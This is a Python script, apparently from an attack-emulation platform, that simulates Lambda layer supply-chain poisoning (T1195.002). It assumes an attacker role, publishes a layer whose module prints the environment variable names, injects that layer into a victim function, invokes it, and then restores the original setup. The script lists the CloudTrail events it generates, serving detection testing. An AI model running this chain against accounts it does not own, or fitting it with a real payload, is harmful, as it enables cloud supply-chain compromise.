# FILE: attack.py
"""
ATOMIC-LAMBDA-EXTERNAL-LAYER-POISONING -- Automated Attack Script
T1195.002: Supply Chain Compromise via Lambda Layer Injection

3-phase chain:
  Phase 1 - Pre-Injection Enumeration (get_function, capture original layers)
  Phase 2 - Layer Publish and Configuration Injection (publish poisoned layer, update function)
  Phase 3 - Supply Chain Trigger and Validation (invoke, assert LAYER_POISONED in tail log)

Entry point: run(outputs, region)
"""
import sys
import time
import random
import json
import base64
import io
import zipfile

import boto3
from botocore.exceptions import ClientError

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ── Static resource names (hardcoded; match resource_names.json) ────────────
VICTIM_FUNCTION_NAME = "atomic-lambda-external-layer-poisoning-victim"
BASELINE_LAYER_NAME  = "atomic-lambda-external-layer-poisoning-common-deps"

# ── Poisoned module source (python/common_utils.py inside the layer zip) ─────
# Prints the LAYER_POISONED marker and env var names (not values) on import.
# Re-exports helper() to prevent ImportError in the victim handler.
POISONED_MODULE_SRC = (
    "import os\n"
    "print('LAYER_POISONED')\n"
    "print('ENV_KEYS:', list(os.environ.keys()))\n"
    "def helper():\n"
    "    return 'baseline'\n"
)


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


# ── Timing helpers ───────────────────────────────────────────────────────────
def op_delay(min_s: float = 2, max_s: float = 6) -> None:
    time.sleep(random.uniform(min_s, max_s))


def phase_delay() -> None:
    time.sleep(random.uniform(5, 15))


# ── Print helpers (ASCII only) ───────────────────────────────────────────────
def print_step(msg: str) -> None:
    print(f"\n[*] {msg}")


def print_ok(msg: str) -> None:
    print(f"[+] {msg}")


def print_err(msg: str) -> None:
    print(f"[-] {msg}")


# ── Build poisoned layer zip in memory ───────────────────────────────────────
def _build_poisoned_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("python/common_utils.py", POISONED_MODULE_SRC)
    return buf.getvalue()


# ── STS session factory ──────────────────────────────────────────────────────
def _assume_role(role_arn: str, session_name: str, region: str) -> boto3.Session:
    sts = _base_session(region).client("sts")
    resp = sts.assume_role(RoleArn=role_arn, RoleSessionName=session_name)
    c = resp["Credentials"]
    return boto3.Session(
        aws_access_key_id=c["AccessKeyId"],
        aws_secret_access_key=c["SecretAccessKey"],
        aws_session_token=c["SessionToken"],
        region_name=region,
    )


# ── Main entry point (backend contract) ──────────────────────────────────────
def run(outputs: dict, region: str = "us-east-1") -> None:
    # ── Resolve required dynamic outputs ────────────────────────────────────
    _set_tenant_credentials(outputs)

    attacker_role_arn = outputs.get("attacker_role_arn", "")
    if not attacker_role_arn:
        raise RuntimeError("Required output 'attacker_role_arn' missing from Pulumi stack outputs")

    events_generated = []

    # ── Assume attacker role (phase_1_attacker_creds) ────────────────────────
    print_step("Assuming attacker role via STS AssumeRole")
    print(f"    Role: {attacker_role_arn}")
    try:
        attacker_session = _assume_role(attacker_role_arn, "layer-poison-emulation", region)
        print_ok("Attacker session established")
    except ClientError as e:
        raise RuntimeError(f"STS AssumeRole failed: {e}") from e

    lam = attacker_session.client("lambda", region_name=region)

    # Track mutable state for cleanup
    poisoned_layer_version: int | None = None
    original_layers: list = []

    try:
        # ════════════════════════════════════════════════════════════════════
        # PHASE 1 -- Pre-Injection Enumeration
        # ════════════════════════════════════════════════════════════════════
        print_step("PHASE 1 -- Pre-Injection Enumeration")

        # Step 1 -- GetFunction: record baseline layer ARN
        # CloudTrail: GetFunction20150331v2 from attacker role (not CI/CD identity)
        print_step("Step 1 -- GetFunction: capture current layer configuration")
        try:
            resp = lam.get_function(FunctionName=VICTIM_FUNCTION_NAME)
            cfg = resp["Configuration"]
            original_layers = [layer["Arn"] for layer in cfg.get("Layers", [])]
            print_ok(f"Victim function retrieved -- current layers: {original_layers}")
            events_generated.append("GetFunction20150331v2 (attacker role)")
        except ClientError as e:
            raise RuntimeError(f"GetFunction failed: {e}") from e

        op_delay(2, 5)
        phase_delay()

        # ════════════════════════════════════════════════════════════════════
        # PHASE 2 -- Layer Publish and Configuration Injection
        # ════════════════════════════════════════════════════════════════════
        print_step("PHASE 2 -- Layer Publish and Configuration Injection")

        # Step 2 -- PublishLayerVersion: push poisoned common_utils module
        # CloudTrail: PublishLayerVersion20181031 from attacker role (not original layer deployer)
        print_step("Step 2 -- PublishLayerVersion: publish poisoned common-deps layer")
        poisoned_zip = _build_poisoned_zip()
        try:
            pub_resp = lam.publish_layer_version(
                LayerName=BASELINE_LAYER_NAME,
                Description="poisoned-emulation",
                Content={"ZipFile": poisoned_zip},
                CompatibleRuntimes=["python3.12"],
            )
            poisoned_layer_version = pub_resp["Version"]
            poisoned_layer_arn = pub_resp["LayerVersionArn"]
            print_ok(
                f"Poisoned layer published -- version {poisoned_layer_version}"
                f" ARN: {poisoned_layer_arn}"
            )
            events_generated.append("PublishLayerVersion20181031 (attacker role)")
        except ClientError as e:
            raise RuntimeError(f"PublishLayerVersion failed: {e}") from e

        op_delay(2, 6)

        # Step 3 -- UpdateFunctionConfiguration: inject poisoned layer ARN
        # CloudTrail: UpdateFunctionConfiguration20150331v2 -- primary supply-chain IOC
        print_step(
            "Step 3 -- UpdateFunctionConfiguration: overwrite victim layers with poisoned ARN"
        )
        try:
            lam.update_function_configuration(
                FunctionName=VICTIM_FUNCTION_NAME,
                Layers=[poisoned_layer_arn],
            )
            print_ok("UpdateFunctionConfiguration accepted -- waiting for propagation")
            events_generated.append("UpdateFunctionConfiguration20150331v2 (layers injected)")
        except ClientError as e:
            raise RuntimeError(f"UpdateFunctionConfiguration failed: {e}") from e

        # Wait for LastUpdateStatus=Successful before invoking
        print_step("Waiting for function update to reach Successful state")
        try:
            waiter = lam.get_waiter("function_updated")
            waiter.wait(
                FunctionName=VICTIM_FUNCTION_NAME,
                WaiterConfig={"Delay": 5, "MaxAttempts": 24},
            )
            print_ok("Function update propagated -- poisoned layer is active")
        except Exception as e:
            raise RuntimeError(f"Waiter function_updated failed: {e}") from e

        op_delay(8, 15)
        phase_delay()

        # ════════════════════════════════════════════════════════════════════
        # PHASE 3 -- Supply Chain Trigger and Validation
        # ════════════════════════════════════════════════════════════════════
        print_step("PHASE 3 -- Supply Chain Trigger and Validation")

        # Step 4 -- InvokeFunction: trigger poisoned layer, validate LAYER_POISONED marker
        # CloudWatch Logs: LAYER_POISONED + ENV_KEYS appear in /aws/lambda/...victim log group
        # CloudTrail (data events): Invoke attributed to attacker role (if data events enabled)
        print_step(
            "Step 4 -- InvokeFunction: trigger poisoned layer execution and validate marker"
        )
        try:
            invoke_resp = lam.invoke(
                FunctionName=VICTIM_FUNCTION_NAME,
                InvocationType="RequestResponse",
                LogType="Tail",
            )
        except ClientError as e:
            raise RuntimeError(f"Lambda invoke failed: {e}") from e

        # Decode tail log from base64
        raw_log = invoke_resp.get("LogResult", "")
        decoded_log = base64.b64decode(raw_log).decode("utf-8", errors="replace") if raw_log else ""

        status_code = invoke_resp.get("StatusCode", 0)
        func_error  = invoke_resp.get("FunctionError", "")

        print(f"    Invoke status: {status_code}")
        if func_error:
            print_err(f"FunctionError: {func_error}")

        if "LAYER_POISONED" in decoded_log:
            print_ok("LAYER_POISONED marker confirmed in Lambda tail log -- supply chain injection validated")
            events_generated.append("LAYER_POISONED marker in CloudWatch Logs")
            events_generated.append("ENV_KEYS list in Lambda log output (module import executed)")
            events_generated.append("Lambda invocation from attacker role principal")
        else:
            print_err("LAYER_POISONED marker NOT found in tail log -- injection may not have propagated")
            print(f"    Tail log snippet: {decoded_log[:500]}")

        op_delay(3, 8)

    finally:
        # ════════════════════════════════════════════════════════════════════
        # CLEANUP -- restore victim function, delete poisoned layer version
        # (runs even on partial failure to leave client account unmodified)
        # ════════════════════════════════════════════════════════════════════
        print_step("CLEANUP -- restoring victim function and deleting poisoned layer")

        # Restore original layer list on victim function
        if original_layers is not None:
            try:
                print_step(
                    f"Restoring victim function layers to original: {original_layers}"
                )
                lam.update_function_configuration(
                    FunctionName=VICTIM_FUNCTION_NAME,
                    Layers=original_layers,
                )
                print_ok("UpdateFunctionConfiguration (restore) accepted")
                # Wait for restore to propagate
                try:
                    waiter = lam.get_waiter("function_updated")
                    waiter.wait(
                        FunctionName=VICTIM_FUNCTION_NAME,
                        WaiterConfig={"Delay": 5, "MaxAttempts": 24},
                    )
                    print_ok("Victim function restored to original layer configuration")
                except Exception as w_err:
                    print_err(f"Waiter after restore: {w_err}")
            except ClientError as e:
                print_err(f"Failed to restore victim function layers: {e}")

        # Delete the poisoned layer version published during the attack
        if poisoned_layer_version is not None:
            try:
                lam.delete_layer_version(
                    LayerName=BASELINE_LAYER_NAME,
                    VersionNumber=poisoned_layer_version,
                )
                print_ok(
                    f"Deleted poisoned layer version {poisoned_layer_version}"
                    f" of {BASELINE_LAYER_NAME}"
                )
            except ClientError as e:
                print_err(f"Failed to delete poisoned layer version: {e}")

    # ── Summary ──────────────────────────────────────────────────────────────
    print("\n" + "=" * 60)
    print("ATTACK SUMMARY -- ATOMIC-LAMBDA-EXTERNAL-LAYER-POISONING")
    print("=" * 60)
    print(f"Technique : T1195.002 -- Supply Chain Compromise (Lambda Layer)")
    print(f"Victim    : {VICTIM_FUNCTION_NAME}")
    print(f"Layer     : {BASELINE_LAYER_NAME} (poisoned version published + deleted)")
    print(f"Region    : {region}")
    print("\nCloudTrail / detection events generated:")
    for i, evt in enumerate(events_generated, 1):
        print(f"  {i}. {evt}")
    print("=" * 60)
